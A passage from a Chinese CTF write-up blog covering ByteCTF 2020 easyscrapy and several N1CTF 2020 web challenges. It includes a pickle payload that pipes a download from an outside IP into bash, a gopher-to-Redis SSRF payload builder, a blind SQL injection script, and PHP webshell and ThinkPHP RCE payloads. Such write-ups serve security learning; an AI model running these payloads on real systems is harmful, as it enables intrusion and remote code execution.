class="string">"http://www.baidu.com"</span>)</span><br></pre></td></tr></table></figure><p>这时就可以成功写入,爬取数据，并将数据存进mongodb。<br>这里我再尝试打一遍redis跟mongodb。发现跟服务端远程是一致的。打redis会提前报错终止，打mongodb会有回显<br><img src="https://i.imgur.com/t0i6Z1n.png" alt></p><p><img src="https://i.imgur.com/0Py191w.png" alt></p><p>不过这里redis因为lpop这个操作。导致我写入的这个list很快就会消失。它存的也不是pickle数据。那么要怎么rce?此时再度陷入僵局</p><p>此时官方放出第三个hint scrapy_redis,题目仍是0解。我开始想scrapy_redis我第一天上午就发现了还需要提示？但是转念想会不会我想要的pickle操作存在于scrapy_redis呢？</p><p><a href="https://github.com/rmax/scrapy-redis" target="_blank" rel="noopener">https://github.com/rmax/scrapy-redis</a></p><p>于是。我用scrapy-redis github上的example-project跑了遍。这个demo是指定了url一直在爬的。于是当我连进redis时，我发现了3个键。并且当我查看他们的时候,终于发现了心心念念的内容也就是pickle的序列化数据。<br><img src="https://i.imgur.com/CwJ70OW.png" alt></p><p>既然存在pickle序列化的数据。那么必然某个地方会反序列化它。这样一来rce的链条立马就清楚了。设置键 -&gt; pickle rce 跟pwnhub6月赛差不多了。</p><p>但是本地为什么没有<code>byte:requests</code>出现呢？我怀疑是因为每次只传入一个url。导致存活时间极短。那么我们不妨用大量数据填充进redis。方法也很简单，上面的脚本加个for循环200次就好了。然后我们在redis里执行几次看看<code>zrange byte:requests 0 1</code><br><img src="https://i.imgur.com/hkiEKsi.png" alt></p><p>既然如此。利用链就清楚了：想办法写入<code>byte:requests</code>键，内容为序列化数据。<br>而写入键唯有pycurl的ssrf可以做到。</p><p>下面就是利用了</p><h2 id="ssrf-gt-rce-exploit"><a href="#ssrf-gt-rce-exploit" class="headerlink" title="ssrf -&gt; rce exploit"></a>ssrf -&gt; rce exploit</h2><p>这里我们首先尝试一下直接写入byte:requests会怎么样。然后惊喜的发现只要写入就会直接触发反序列化。那么也就是说直接利用<code>/result?url</code>就可以打了。</p><p>然后推测一波版本，这里我打远程用的protocol协议为2.0的pickle成功了。当时getshell没看python版本,估计是2.7.(scrapy 一般在2.7 或3.5/3.6跑)</p><p>一个比较头疼的点是如何写入opcode的16进制数据。之前pwnhub6月赛时写pickle数据是因为crlf比较简单。可以直接加个引号括起来写。这里我们只能gopher打。那么转数据时出了不少麻烦。最后我简单改了下redis-ssrf这个脚本的内容。用python2 跑。确认它不会像python3那样自动转义我的16进制字符串。终于构造出可以打的payload</p><p>python3 运行以得到pickle 16进制序列化数据。py2的直接写貌似有点问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        s = <span class="string">"""curl 120.27.246.202|bash"""</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e,protocol=<span class="number">2</span>)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure><p>python2 运行 convert.py<br>注意我们执行的是zadd。因为之前本地已经知道了requests是zset类型数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_key</span><span class="params">(key,payload)</span>:</span></span><br><span class="line">    cmd=[</span><br><span class="line">    <span class="string">"zadd &#123;0&#125; 1 &#123;1&#125;"</span>.format(key,payload),</span><br><span class="line">    <span class="string">"quit"</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x)))+CRLF+x</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_payload</span><span class="params">()</span>:</span></span><br><span class="line">    key = <span class="string">"byte:requests"</span></span><br><span class="line">    payload =<span class="string">"""\x80\x02cposix\nsystem\nq\x00X\x18\x00\x00\x00curl 120.27.246.202|bashq\x01\x85q\x02Rq\x03."""</span>.replace(<span class="string">' '</span>,<span class="string">'\x12'</span>)</span><br><span class="line">    cmd=set_key(key,payload)</span><br><span class="line">    protocol=<span class="string">"gopher://"</span></span><br><span class="line"></span><br><span class="line">    ip=<span class="string">"172.20.0.7"</span></span><br><span class="line">    port=<span class="string">"6379"</span></span><br><span class="line"></span><br><span class="line">    payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += quote(redis_format(x).replace(<span class="string">"^"</span>,<span class="string">" "</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    passwd = <span class="string">''</span></span><br><span class="line">    p=generate_payload()</span><br><span class="line">    print(p.replace(<span class="string">'%12'</span>,<span class="string">'%20'</span>))</span><br></pre></td></tr></table></figure><p>一个小坑是我的空格总是会被错转。于是干脆先把空格填充一下最后再换回<code>%20</code>即可。</p><p>打本地成了后，远程必然没有问题了。<br>最后因为get传参,我们注意二次url编码即可。执行命令<code>curl xxx|bash</code><br>(读文件确认有bash,pycurl确认有curl,同时之前把命令往tmp下写时发现有readflag)</p><p>getshell :)<br><img src="https://i.imgur.com/7afkg9s.png" alt></p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>  所以非常可惜。利用链想好后结果去赶飞机错过了比赛中解出的机会。不过思路还是很考验人的。题目质量很高。就是本地环境有点磨人。。。</p><p>最后分享下我按照源码搭好的docker环境。<br><a href="https://github.com/baiyecha404/CTFWEBchallenge/tree/master/bytectf2020/easyscrapy" target="_blank" rel="noopener">https://github.com/baiyecha404/CTFWEBchallenge/tree/master/bytectf2020/easyscrapy</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>N1CTF2020</title>
      <link href="2020/10/19/N1CTF2020/"/>
      <url>2020/10/19/N1CTF2020/</url>
      
        <content type="html"><![CDATA[<p>  N1CTF的题目质量毋庸置疑,可惜自己能力不足。除了签到还看了easytp5,filters,还有渗透系列的Victim.基本都没思路或者思路跑偏了……抓紧复现下来学习学习。</p><a id="more"></a><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>这题拿的二血难受死了,错失空指针邀请码……(西湖upload也是二血,自己人最近也有点水逆，难道这就是2的诅咒么？:(  )</p><p>source</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ip</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $ip;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="keyword">$this</span>-&gt;waf($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip =$_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $con=mysqli_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"********"</span>,<span class="string">"n1ctf_websign"</span>);</span><br><span class="line">        $sqlquery=sprintf(<span class="string">"INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')"</span>,<span class="keyword">$this</span>-&gt;waf($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]),time());</span><br><span class="line">        <span class="keyword">if</span>(!mysqli_query($con,$sqlquery))&#123;</span><br><span class="line">            <span class="keyword">return</span> mysqli_error($con);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"your ip looks ok!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mysqli_close($con);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $ip;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ip)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ip = $ip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;check)===md5(<span class="string">"key****************"</span>))&#123;</span><br><span class="line">    readfile(<span class="string">'/flag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(stristr(<span class="keyword">$this</span>-&gt;ip, <span class="string">"n1ctf"</span>)!==<span class="keyword">False</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">"welcome to n1ctf2020"</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">"noip"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;getflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'input'</span>]))&#123;</span><br><span class="line">    $input = $_GET[<span class="string">'input'</span>];</span><br><span class="line">unserialize($input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然我们需要getflag的话,需要拿到数据库里的key.而key需要通过sql注入获取。这里唯一存在注入的地方在ip的<code>__toString</code>中。故通过反序列化触发<code>__toString</code>即可。设置flag类的<code>ip</code>为ip类就可以在<code>stristr</code>处触发了。</p><p>接下来就是黑盒waf下进行注入的事了。<br>我的思路比较直接。直接时间盲注。当然这里稍微构造下进行报错盲注也是可以的。(因为<code>__toString</code>的返回值会与n1ctf比较,而<code>__toString</code>返回值有mysql报错与”your ip looks ok!”两种，那么就可以构造报错从而产生布尔值来盲注了)</p><p>时间盲注的话,由于ban了不少关键词,所以我是现学的新方法<br><code>select rpad(&#39;a&#39;,2999999,&#39;a&#39;) regexp concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;)</code></p><p>其实挺像 js里的正则盲注的。当然其实从其他几种时间盲注方法如heavy query就可以推出这种令服务端产生负荷的方法必然可行233。<br>然后题目只waf掉了rpad,rpad不能用的话改成lpad就好了:)</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://101.32.205.189/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">(payload)</span>:</span></span><br><span class="line">    r = requests.get(url, params=&#123;<span class="string">'input'</span>: payload&#125;)</span><br><span class="line">    print(r.text)</span><br><span class="line"><span class="comment">#key n1ctf20205bf75ab0a30dfc0c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqli</span><span class="params">()</span>:</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">            headers = &#123;</span><br><span class="line">                <span class="comment">#'X-Forwarded-For': "1'^(if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ),"+str(i)+",1))=" + str(ord(j)) + ",(select lpad('a',2999999,'a') regexp concat(repeat('(a.*)+',30),'b')),0))^'1"</span></span><br><span class="line">                <span class="comment">#'X-Forwarded-For': "1'^(if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='n1key'),"+str(i)+",1))=" + str(j) + ",(select lpad('a',2999999,'a') regexp concat(repeat('(a.*)+',30),'b')),0))^'1"</span></span><br><span class="line">                <span class="string">'X-Forwarded-For'</span>: <span class="string">"1'^(if(ascii(substr((select `2` from (select 1,2 union select * from n1key)a limit 1,1),"</span>+str(i)+<span class="string">",1))="</span> + str(ord(j)) + <span class="string">",(select lpad('a',2999999,'a') regexp concat(repeat('(a.*)+',30),'b')),0))^'1"</span></span><br><span class="line">                <span class="comment"># select `2` from (select 1,2 union select * from n1key) a limit 1,1</span></span><br><span class="line">            &#125;</span><br><span class="line">            t = time.time()</span><br><span class="line">            r = requests.get(url, params=&#123;<span class="string">'input'</span>: payload&#125;, headers=headers)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'hack'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                print(<span class="string">'banwords'</span>)</span><br><span class="line">            <span class="keyword">if</span> time.time() - t &gt; <span class="number">2.5</span>:</span><br><span class="line">                res +=j</span><br><span class="line">                print(res)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment">#sqli('O:4:"flag":2:&#123;s:2:"ip";O:2:"ip":1:&#123;s:2:"ip";N;&#125;s:5:"check";N;&#125;')</span></span><br><span class="line">    getflag(<span class="string">'O:4:"flag":2:&#123;s:2:"ip";N;s:5:"check";s:25:"n1ctf20205bf75ab0a30dfc0c";&#125;'</span>)</span><br></pre></td></tr></table></figure><p>这里浪费我时间最久的就是最后一步<code>select key from n1key</code>,导致错失一血。试了好久还换了一种注法才怀疑是他服务端waf了这个语句。然后尝试性的改成无列名注入<code>select `2` from (select 1,2 union select * from n1key)a limit 1,1</code>就成了 orz. 所以可能还是自己太菜才错失良机吧。</p><h2 id="filters"><a href="#filters" class="headerlink" title="filters"></a>filters</h2><p>source</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>($_POST[<span class="string">'filters'</span>])?print_r(<span class="string">"show me your filters!"</span>): <span class="keyword">die</span>(highlight_file(<span class="keyword">__FILE__</span>));</span><br><span class="line">$input = explode(<span class="string">"/"</span>,$_POST[<span class="string">'filters'</span>]);</span><br><span class="line">$source_file = <span class="string">"/var/tmp/"</span>.sha1($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">$file_contents = [];</span><br><span class="line"><span class="keyword">foreach</span>($input <span class="keyword">as</span> $filter)&#123;</span><br><span class="line">    array_push($file_contents, file_get_contents(<span class="string">"php://filter/"</span>.$filter.<span class="string">"/resource=/usr/bin/php"</span>));</span><br><span class="line">&#125;</span><br><span class="line">shuffle($file_contents);</span><br><span class="line">file_put_contents($source_file, $file_contents);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">require_once</span> $source_file;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(\Throwable $e)&#123;</span><br><span class="line">    pass;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unlink($source_file);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这题自己就没做出来了。不过可以分享下我当时的思路,我感觉应该是控制filter过滤器多层组合fuzz来构造任意字符。也就是说前提是在resource始终为<code>/usr/bin/php</code>下的。</p><p>假如这里不是file_get_contents的话其实很简单,因为过滤器的内容可以使用我们自定义的,所以像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13|&lt;?cuc @riny($_CBFG[Dsgz])?&gt;&#x2F;resource&#x3D;</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSb[cy)]?; &gt;</span><br></pre></td></tr></table></figure><p>可以在file_put_contents()时写入指定文件。并且warning不影响写入。不过出题人肯定知道这点所以是先file_get_contents再file_put_contents。并且文件名的参数也不可控，所以就不知道是什么奇淫技巧了。</p><p>ps: 看到官方wp的确是fuzz构造字符。有点orange 的 oneline php challenge那味了。</p><p>看到SuperGusser的wp后感觉他们的思路是真的简单。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filters&#x3D;resource&#x3D;data:,&lt;?php%20system(&#39;ls&#39;);?&gt;</span><br></pre></td></tr></table></figure><p>直接最质朴的data协议写入,不用带上text,plain,base64之类的。那么后面的内容都被当做data的内容了。所以根本不用管<code>/</code>了</p><h2 id="easytp5"><a href="#easytp5" class="headerlink" title="easytp5"></a>easytp5</h2><p>smile大师傅的题必然少不了thinkphp ?<br>这题我思路有点走偏了，其实要是按照原来暑假跟过的tp5.0 的rce思路应该会顺利多了。</p><p>以下内容可以在直接学习tp漏洞的笔记找到<br>首先是一个tp5 rce的通用点。那就是可以通过控制器来覆盖值。<br>在Request.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[Config::get(<span class="string">'var_method'</span>)])) &#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;method = strtoupper($_POST[Config::get(<span class="string">'var_method'</span>)]);</span><br><span class="line">      <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>典型的就是可以调用Request任意方法并以<code>$_POST</code>为参数。<br>然后进<code>__construct</code>后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($options = [])</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($options <span class="keyword">as</span> $name =&gt; $item) &#123;</span><br><span class="line">            <span class="keyword">if</span> (property_exists(<span class="keyword">$this</span>, $name)) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;$name = $item;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;filter)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter = Config::get(<span class="string">'default_filter'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一个任意参数覆盖。所以还是利用这个类的所有可控参数来找gadget打。<br>这里继续下断点一路跟发现会根据app_debug的值前往当前类下param方法。<br>而这个方法全都走input方法。也就是都会调用了call_user_func。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//input</span></span><br><span class="line"><span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">    array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">    reset($data);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//filterValue</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $default = array_pop($filters);</span><br><span class="line">    <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">            <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">            $value = call_user_func($filter, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_scalar($value)) &#123;</span><br></pre></td></tr></table></figure><p>以上部分跟tp5的rce思路完全一致。只不过题目设置了disable_function,以及禁用了一些单参数函数。导致大部分payload都不可行。</p><p>那么比较重要的就是找gadget了。<br>我们可以控制filter,然后进行任意方法的单参数rce.不过由于for循环循环调用<code>$value</code>.所以可以搭配gadget进行rce.<br>这里可以找恶意函数找到eval<br><code>thinkphp\library\think\view\driver\Php.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($content, $data = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($data[<span class="string">'content'</span>])) &#123;</span><br><span class="line">        $__content__ = $content;</span><br><span class="line">        extract($data, EXTR_OVERWRITE);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'?&gt;'</span> . $__content__);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        extract($data, EXTR_OVERWRITE);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'?&gt;'</span> . $content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为这里的直接调用会报错,所以看到SuperGuesser的wp里提到了设置set_error_handler 为任意其他函数来避免tp的默认错误处理。此处是<code>implode</code>.那么就可以直接继续了。<br>关于filter的调用。<br><img src="/2020/10/19/N1CTF2020/0.PNG" alt><br>就是这四次调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.set_error_handler &quot;implode&quot;</span><br><span class="line">2.self::path  base64-payload </span><br><span class="line">3.base64_decode  base64-payload </span><br><span class="line">4.\think\view\driver\Php::Display payload</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;?s&#x3D;captcha&amp;g&#x3D;implode&quot;</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">path&#x3D;PD9waHAgZmlsZV9wdXRfY29udGVudHMoJ2J5Yy5waHAnLCc8P3BocCBldmFsKCRfUkVRVUVTVFtieWNdKTs&#x2F;PicpOyA&#x2F;P</span><br><span class="line">g&#x3D;&#x3D;&amp;_method&#x3D;__construct&amp;filter[]&#x3D;set_error_handler&amp;filter[]&#x3D;self::path&amp;filter[]&#x3D;base64_decode&amp;filter[]&#x3D;\think\view\driver\Php::Display&amp;method&#x3D;GET</span><br></pre></td></tr></table></figure><p>这里我觉得利用<code>::</code>的确意想不到。以为按照自己的认识来说<code>::</code>是用来访问静态属性跟方法。没想到是可以调非静态的(有warning).基于上面已经解决了tp报错的问题,这里也就没啥问题了。</p><p>看到smi1e分享了其他一些非预期解以及预期解。打算跟一跟</p><h2 id="The-king-of-phish-Victim-bot"><a href="#The-king-of-phish-Victim-bot" class="headerlink" title="The king of phish (Victim 